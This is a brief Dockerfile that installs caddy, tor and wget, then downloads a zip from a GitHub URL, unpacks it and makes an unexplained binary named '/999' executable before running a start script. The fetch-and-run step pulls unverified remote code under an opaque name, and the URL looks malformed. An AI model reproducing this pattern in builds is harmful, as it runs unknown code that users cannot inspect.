FROM alpine:edge

RUN apk update && \
    apk add --no-cache ca-certificates caddy tor wget && \
    wget -qO- https://raw.githubusercontent.com/ritzeo/html-test/blob/main/etc/aaa.zip | busybox unzip - && \
    chmod +x /999 && \
    rm -rf /var/cache/apk/*

ADD start.sh /start.sh
RUN chmod +x /start.sh

CMD /start.sh
